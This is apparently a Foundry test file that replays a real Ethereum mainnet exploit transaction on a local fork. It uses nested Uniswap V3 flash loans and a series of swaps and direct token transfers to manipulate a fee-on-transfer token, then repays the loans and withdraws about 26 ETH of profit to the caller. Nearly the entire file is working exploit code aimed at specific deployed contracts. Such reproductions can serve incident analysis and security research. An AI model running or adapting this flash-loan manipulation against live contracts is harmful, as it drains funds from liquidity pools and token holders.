// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

// https://explorer.phalcon.xyz/tx/eth/0x3e9bcee951cdad84805e0c82d2a1e982e71f2ec301a1cbd344c832e0acaee813
// https://etherscan.io/address/0x864E656c57A5A119F332C47326A35422294DB5C9

struct S1 {
    address p1;
    address p2;
    uint24 p3;
    address p4;
    uint256 p5;
    uint256 p6;
    uint256 p7;
    uint160 p8;
}

interface I {
    function flash(address, uint256, uint256, bytes memory) external payable;
    function swapTokensForExactTokens(uint256, uint256, address[] memory, address, uint256) external payable;
    function transfer(address, uint256) external payable;
    function exactInputSingle(S1 memory) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] memory,
        address,
        uint256
    ) external payable;
    function decimals() external payable;
    function withdraw(uint256) external payable;
    function token0() external payable returns (address);
    function balanceOf(address) external payable returns (uint256);
    function approve(address, uint256) external payable;
}

contract X03e7 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0x3e9bcee951cdad84805e0c82d2a1e982e71f2ec301a1cbd344c832e0acaee813");
    }

    address constant x1098 = 0x109830a1AAaD605BbF02a9dFA7B0B92EC2FB7dAa;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x66ba = 0x66bA59cBD09E75B209D1D7E8Cf97f4Ab34DA413B;
    address constant x7a25 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant x7f39 = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant x8390 = 0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xe592 = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    uint256 t_uniswapV3FlashCallback = 0;

    function test() public {
        vm.createSelectFork("http://localhost:18545", 18538678); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x3e9bcee951cdad84805e0c82d2a1e982e71f2ec301a1cbd344c832e0acaee813));

        // https://explorer.phalcon.xyz/tx/eth/0x3e9bcee951cdad84805e0c82d2a1e982e71f2ec301a1cbd344c832e0acaee813
        x2e9b36e7();
    }

    function test3() public {
        vm.createSelectFork("http://localhost:18545", 18538678); // tx.blockNumber - 1

        address RECEIVER = address(this);
        vm.warp(1699584695);
        vm.roll(18538679);
        // https://explorer.phalcon.xyz/tx/eth/0x3e9bcee951cdad84805e0c82d2a1e982e71f2ec301a1cbd344c832e0acaee813
        vm.deal(RECEIVER, 10 ether);
        vm.store(
            address(0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5),
            keccak256(abi.encode(RECEIVER, uint256(1))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),
            keccak256(abi.encode(RECEIVER, uint256(3))),
            bytes32(uint256(1000000000000000000000000))
        );
        x2e9b36e7();
    }

    function x2e9b36e7() public {
        // address v1 = x7f39;
        address v1 = I(x1098).token0();
        console2.log("I(x1098).token0()\t->", v1);

        bytes memory b01 = abi.encode(xc02a, 30000000000000000000);
        I(x1098).flash(r, 0, 30000000000000000000, b01);

        // uint256 v2 = 0;
        uint256 v2 = I(x8390).balanceOf(r);
        console2.log("I(x8390).balanceOf(r)\t\t->", uint256(0));
        // uint256 v3 = 26382963431285374891;
        uint256 v3 = I(xc02a).balanceOf(r);
        console2.log("I(xc02a).balanceOf(r)\t\t->", "26382963431285374891 (26.3829 ether)");
        I(xc02a).withdraw(v3);
        address(tx.origin).call{value: 26382963431285374891}("");
        // uint256 v4 = 0;
        uint256 v4 = I(x8390).balanceOf(r);
        console2.log("I(x8390).balanceOf(r)\t\t->", uint256(0));
    }

    function uniswapV3FlashCallback(uint256, uint256, bytes memory) public {
        t_uniswapV3FlashCallback++;

        if (t_uniswapV3FlashCallback == 1) {
            // uint256 v1 = 63433590767572373;
            uint256 v1 = I(x8390).balanceOf(x66ba);
            console2.log("I(x8390).balanceOf(x66ba)\t->", "63433590767572373 (0.6343 ether)");
            // address v2 = x8390;
            address v2 = I(x66ba).token0();
            console2.log("I(x66ba).token0()\t->", v2);

            bytes memory b03 = abi.encode(x8390, 63433590767572373);
            I(x66ba).flash(r, v1, 0, b03);

            I(xc02a).approve(x7a25, 30000000000000000000);

            address[] memory arr05 = new address[](2);
            arr05[0] = xc02a;
            arr05[1] = x8390;
            I(x7a25)
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    30000000000000000000, 0, arr05, r, block.timestamp + 1
                );

            // uint256 v3 = 17906643278652560;
            uint256 v3 = I(x8390).balanceOf(r);
            console2.log("I(x8390).balanceOf(r)\t\t->", "17906643278652560 (0.1790 ether)");
            I(x8390).approve(xe592, v3);

            S1 memory s101 = S1(x8390, xc02a, 10000, r, 1699584695, 17906643278652560, 30000000000000000000, 0);
            I(xe592).exactInputSingle(s101);

            // uint256 v4 = 56385963431285374891;
            uint256 v4 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "56385963431285374891 (56.3859 ether)");
            I(xc02a).transfer(x1098, 30003000000000000000);
            return;
        }
        if (t_uniswapV3FlashCallback == 2) {
            // uint256 v1 = 66262042000910581;
            uint256 v1 = I(x8390).balanceOf(x8390);
            console2.log("I(x8390).balanceOf(x8390)\t->", "66262042000910581 (0.6626 ether)");
            I(x8390).decimals();
            // uint256 v2 = 63433590767572373;
            uint256 v2 = I(x8390).balanceOf(r);
            console2.log("I(x8390).balanceOf(r)\t\t->", "63433590767572373 (0.6343 ether)");
            // uint256 v3 = 63433590767572373;
            uint256 v3 = I(x8390).balanceOf(r);
            console2.log("I(x8390).balanceOf(r)\t\t->", "63433590767572373 (0.6343 ether)");
            I(x8390).approve(x7a25, 30695631768482954);

            address[] memory arr01 = new address[](2);
            arr01[0] = x8390;
            arr01[1] = xc02a;
            I(x7a25)
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    30695631768482954, 0, arr01, r, block.timestamp + 1
                );

            // uint256 v4 = 66262042000910581;
            uint256 v4 = I(x8390).balanceOf(x8390);
            console2.log("I(x8390).balanceOf(x8390)\t->", "66262042000910581 (0.6626 ether)");
            I(x8390).decimals();
            I(x8390).transfer(x8390, 2737958999089419);
            I(x8390).approve(x7a25, 30000000000000000);

            address[] memory arr02 = new address[](2);
            arr02[0] = x8390;
            arr02[1] = xc02a;
            I(x7a25)
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    30000000000000000, 0, arr02, r, block.timestamp + 1
                );

            // uint256 v5 = 0;
            uint256 v5 = I(x8390).balanceOf(r);
            console2.log("I(x8390).balanceOf(r)\t\t->", uint256(0));
            // uint256 v6 = 0;
            uint256 v6 = I(x8390).balanceOf(r);
            console2.log("I(x8390).balanceOf(r)\t\t->", uint256(0));
            // uint256 v7 = 104401603085934625288;
            uint256 v7 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "104401603085934625288 (104.4016 ether)");
            I(xc02a).approve(x7a25, v7);
            // uint256 v8 = 104401603085934625288;
            uint256 v8 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "104401603085934625288 (104.4016 ether)");

            address[] memory arr04 = new address[](2);
            arr04[0] = xc02a;
            arr04[1] = x8390;
            I(x7a25).swapTokensForExactTokens(64067926675248097, v8, arr04, r, block.timestamp + 1);

            // uint256 v9 = 64067926675248097;
            uint256 v9 = I(x8390).balanceOf(r);
            console2.log("I(x8390).balanceOf(r)\t\t->", "64067926675248097 (0.6406 ether)");
            I(x8390).transfer(x66ba, v9);
            return;
        }
    }

    function call() public payable {}

    fallback() external payable {
        revert("no such function");
    }
}
